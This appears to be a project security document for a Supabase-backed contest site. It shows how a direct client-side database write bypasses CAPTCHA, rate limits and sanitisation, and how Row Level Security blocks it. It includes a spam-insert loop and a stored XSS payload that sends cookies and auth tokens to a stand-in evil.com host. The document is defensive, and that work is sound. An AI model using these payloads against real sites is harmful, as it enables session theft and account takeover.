# Attack Example: Direct Database Write

## ⚠️ WARNING: For Educational Purposes Only

This document shows how an attacker could bypass the server-side protections
(CAPTCHA, rate limiting, sanitization) by writing **directly** to the database,
and how **Row Level Security (RLS)** stops it. After the correct RLS policies are
in place, these attacks fail.

---

## Attack Scenario: Bypassing the Edge Function

JomContest routes abuse-prone writes (e.g. `receipts`, and ideally `feedback`)
through a **Supabase Edge Function** that verifies a Cloudflare Turnstile token,
enforces rate limits, and sanitizes input before writing with the service role.

An attacker's goal is to skip that Edge Function and write straight to the table.

### Step 1: Attacker Opens Browser Console

An attacker opens your website, logs in (or creates an account), then opens
browser DevTools console (F12).

### Step 2: Create a Supabase Client

The Supabase URL and **publishable/anon** key are public by design (they ship in
the client bundle). RLS is what actually protects the data.

```javascript
// In browser console:

// Option A: reuse the app's client if exposed
const supabase = window.__supabase

// Option B: create their own client with values read from the bundle/network
import { createClient } from '@supabase/supabase-js'
const supabase = createClient(
  'https://your-project.supabase.co', // NEXT_PUBLIC_SUPABASE_URL
  'sb_publishable_...' // NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY (public, safe)
)
```

### Step 3: Direct Write Attack (Before RLS is correct)

```javascript
// ❌ BEFORE FIX: if the table allows INSERT for the `authenticated` role,
// this succeeds and bypasses ALL server-side protections!

await supabase.from('feedback').insert({
  user_id: 'any_user_id', // Can impersonate anyone!
  message: '<script>alert("XSS")</script>', // XSS payload
  page_url: 'https://evil.com', // Fake URL
})

// Result: Row created!
// - No CAPTCHA verification ❌
// - No rate limiting ❌
// - No input sanitization ❌
// - No suspicious activity log ❌
```

### Step 4: Spam Attack

```javascript
// Spam 1000 rows in seconds
for (let i = 0; i < 1000; i++) {
  await supabase.from('feedback').insert({
    user_id: 'victim_user_id',
    message: `Spam message ${i}`,
    page_url: 'https://spam.com',
  })
}

// Result: Table flooded with spam ❌
```

### Step 5: XSS Attack

```javascript
// Store XSS payload in the database
await supabase.from('feedback').insert({
  user_id: 'attacker_id',
  message: `
    <img src=x onerror="
      fetch('https://evil.com/steal?cookie=' + document.cookie);
      fetch('https://evil.com/steal?token=' + localStorage.getItem('sb-your-project-auth-token'));
    ">
  `,
  page_url: 'https://jomcontest.com',
})

// If an admin views this feedback without sanitization:
// - Session token stolen ❌
// - Cookies stolen ❌
// - Account compromised ❌
```

---

## ✅ After Fix: All Attacks Fail

### Step 1: Lock Down the Table with RLS

Enable RLS and only allow reads (scoped to the owner). Do **not** grant a direct
`INSERT` policy to the `authenticated` role — writes must go through the Edge
Function, which uses the service role key (and the service role bypasses RLS).

```sql
alter table public.feedback enable row level security;

-- Users can read only their own rows
create policy "read own feedback"
  on public.feedback for select
  to authenticated
  using (auth.uid() = user_id);

-- NOTE: no INSERT policy for `authenticated` → direct client inserts are denied.
-- The Edge Function writes with the service role key, which bypasses RLS.
```

### Step 2: Attacker Tries the Same Attack

```javascript
// ✅ AFTER FIX: this fails!

const { error } = await supabase.from('feedback').insert({
  user_id: 'any_user_id',
  message: '<script>alert("XSS")</script>',
  page_url: 'https://evil.com',
})

// Result: Error!
// error.message: new row violates row-level security policy for table "feedback"
// error.code: '42501' (insufficient_privilege)
```

### Step 3: Only the Valid Path Works

```javascript
// ✅ The attacker must use the UI, which enforces security

// User clicks feedback button
// → FeedbackDialog opens
// → User enters message
// → CAPTCHA verification required ✅
// → Rate limiting enforced ✅
// → Input sanitized ✅
// → Suspicious activity logged ✅
// → Edge Function inserts the row (with the service role key)
```

---

## 🔍 How Attackers Find Your API Details

### 1. Network Requests

Open DevTools → Network tab → Submit feedback:

```http
POST https://your-project.supabase.co/functions/v1/receipts
Headers:
  apikey: sb_publishable_...
  Authorization: Bearer <user-jwt>
Body:
  {
    "user_id": "user123",
    "captcha_token": "xxx"
  }
```

Or a direct PostgREST call:

```http
POST https://your-project.supabase.co/rest/v1/feedback
Headers:
  apikey: sb_publishable_...
  Authorization: Bearer <user-jwt>
```

**Attacker learns:**

- Supabase URL: `https://your-project.supabase.co`
- Publishable/anon key (public — safe because of RLS)
- Table/endpoint names: `feedback`, `receipts`

### 2. JavaScript Bundle

Attacker inspects your bundled JavaScript:

```javascript
// In your app's JS bundle (all public, all safe with RLS):
const SUPABASE_URL = 'https://your-project.supabase.co'
const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_...'
```

### 3. What Stays Secret

- `SUPABASE_SERVICE_ROLE_KEY` — **never** in the client; only in Edge Function secrets
- `TURNSTILE_SECRET_KEY` — only in Edge Function secrets

Without the service role key, RLS applies to every request the attacker can make.

---

## 🛡️ Defense: Multiple Layers

### Layer 1: Row Level Security (This Fix)

```sql
-- feedback table:
-- SELECT: owner only
-- INSERT: none for authenticated → clients cannot write directly
```

**Result:** Direct writes fail with `42501` (RLS violation)

### Layer 2: Edge Function Validation

```typescript
// In the receipts/feedback Edge Function:
// 1. Verify CAPTCHA token ✅
// 2. Check rate limits ✅
// 3. Sanitize input ✅
// 4. Log suspicious activity ✅
// 5. Insert row (with service role key) ✅
```

**Result:** Even if the attacker calls the function, security is enforced

### Layer 3: Service Role Key Isolation

```
SUPABASE_SERVICE_ROLE_KEY:
- Stored only as an Edge Function secret
- Bypasses RLS (so it must never reach the client)
```

**Result:** The only code that can write is server-side and validated

### Layer 4: Input Sanitization

```typescript
// In the Edge Function:
- Remove HTML tags ✅
- Remove script patterns ✅
- Remove dangerous schemes ✅
- Enforce length limits ✅
```

**Result:** XSS payloads are neutralized

### Layer 5: Rate Limiting

```typescript
// In the Edge Function:
- Per-user limits ✅
- Per-IP limits ✅
- Global limits ✅
```

**Result:** Spam attacks are throttled

---

## 🧪 Test the Fix

### Test 1: Direct Write (Should Fail)

**In browser console:**

```javascript
import { createClient } from '@supabase/supabase-js'
const supabase = createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY)

const { data, error } = await supabase.from('feedback').insert({
  user_id: 'test',
  message: 'test',
  page_url: 'https://test.com',
})

if (error) {
  console.log('✅ SECURE: Direct write blocked!', error.message)
  // Expected: new row violates row-level security policy for table "feedback"
} else {
  console.log('❌ SECURITY ISSUE: Direct write succeeded!', data)
}
```

### Test 2: Function Write (Should Succeed)

**In UI:**

1. Click feedback button
2. Enter message: "Test feedback"
3. Complete CAPTCHA
4. Click "Submit Feedback"
5. Should succeed with success toast ✅

### Test 3: Verify in Database

**In the Supabase Dashboard (Table Editor / SQL):**

1. Open `public.feedback`
2. Find the test row
3. Verify:
   - `message` is sanitized (no HTML tags)
   - `page_url` is valid
   - `user_id` matches the logged-in user
   - `created_at` timestamp is recent

---

## 📊 Attack Impact Comparison

### Before Fix (Vulnerable):

| Attack Type       | Possible? | Impact                       |
| ----------------- | --------- | ---------------------------- |
| Spam flooding     | ✅ Yes    | Table filled with garbage    |
| XSS injection     | ✅ Yes    | Admin accounts compromised   |
| Impersonation     | ✅ Yes    | Fake feedback from any user  |
| Rate limit bypass | ✅ Yes    | Unlimited submissions        |
| CAPTCHA bypass    | ✅ Yes    | Bot attacks succeed          |

### After Fix (Secure):

| Attack Type       | Possible? | Impact                       |
| ----------------- | --------- | ---------------------------- |
| Spam flooding     | ❌ No     | RLS blocks direct writes     |
| XSS injection     | ❌ No     | Input sanitized in function  |
| Impersonation     | ❌ No     | user_id from the auth token  |
| Rate limit bypass | ❌ No     | Edge Function enforces limits|
| CAPTCHA bypass    | ❌ No     | Edge Function verifies token |

---

## 🚨 Real-World Attack Scenario

### Timeline:

**Day 1 (Before Fix):**

- Attacker discovers a table with a permissive INSERT policy
- Writes a script to spam feedback
- Submits 10,000 rows in 10 minutes
- Database storage costs spike
- Admin dashboard unusable

**Day 2:**

- Attacker injects XSS payload
- Admin views feedback
- Session token stolen
- Attacker gains admin access
- Deletes contests, steals user data

**Day 3:**

- Users report missing contests
- Reputation damaged
- Legal liability for data breach

### With Fix:

**Day 1:**

- Attacker tries to spam
- Every direct insert fails with an RLS error (`42501`)
- Gives up and moves on
- Business continues normally ✅

---

## 💡 Key Takeaways

1. **Never trust client-side security** — always enforce on the server
2. **Enable RLS on every table** — deny direct client writes to sensitive tables
3. **Use the service role only in Edge Functions** — it bypasses RLS, so keep it secret
4. **Defense in depth** — RLS + CAPTCHA + rate limits + sanitization
5. **Test your security** — try to attack your own app

---

## 📚 Related Documentation

- [CAPTCHA Security](./CAPTCHA_SECURITY.md) — server-side verification flow
- [Environment Variables](./ENVIRONMENT_VARIABLES.md) — which keys are public vs secret
- `supabase/functions/receipts/index.ts` — Edge Function that enforces the write rules

---

_⚠️ For Educational Purposes Only_
_Do Not Use for Malicious Purposes_
